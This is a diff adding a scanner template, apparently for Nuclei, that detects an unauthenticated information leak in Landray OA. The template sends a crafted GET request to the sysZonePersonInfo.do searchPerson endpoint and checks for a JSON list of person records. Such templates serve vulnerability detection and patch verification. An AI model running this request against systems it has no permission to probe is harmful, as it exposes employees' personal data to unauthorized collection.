@@ -1,0 +1,26 @@
+id: landray-oa-syszone-personinfodo-info-leak
+info:
+  name: Landray OA sysZonePersonInfo.do Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak
+
+http:
+  - raw:
+      - |
+        GET /sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=30&s_ajax=true HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/json"
+      - type: word
+        part: body
+        words:
+          - '{"columns":[{"title":"fdId"}'
